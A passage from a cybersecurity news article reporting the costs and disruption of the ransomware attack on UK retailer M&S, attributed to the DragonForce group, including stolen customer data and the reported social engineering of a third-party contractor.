The retailer, which has more than 60,000 employees and 500 stores, is now in the process of recovering and restoring its systems.\n\nThe incident has resulted in food sales losses due to reduced availability, as well as additional waste and logistics expenses due to the need to manually operate processes, which has hit first quarter profits.\n\nWhile fashion, home and beauty physical stores have remained operational, online shopping has been temporarily halted.\n\n“We expect online disruption to continue throughout June and into July as we restart, then ramp up operations,” the company said. “This will also mean increased stock management costs in the second quarter.”\n\nM&S was one of the several major UK retailers targeted by cybercrimnals. A ransomware group calling itself DragonForce has taken credit for the attack on M&S, as well as on Co-op and Harrods. Google warned last week that the same group has also started targeting US retailers.\n\nM&S has confirmed that the attackers have stolen customer information, including names, addresses, email addresses, phone numbers, dates of birth, online order history, household information, and partial payment card data.\n\nThe retailer revealed this week that its systems were breached after the hackers used social engineering against employees at an unnamed third-party contractor. Reuters learned from sources that the contractor in question is Tata Consulting Services. Neither Tata Consulting Services nor M&S provided confirmation.\n\nM&S has not shared any details on the ransom demand and it’s unclear if the company paid anything to the cybercriminals.\n\nRelated: Ransomware Attack Cost Keytronic Over $17 Million\n\nRelated: Cyberattack Cost Oil Giant Halliburton $35 Million\n\nRelated: Ransomware Hits Critical Infrastructure Hard, Costs Adding Up",
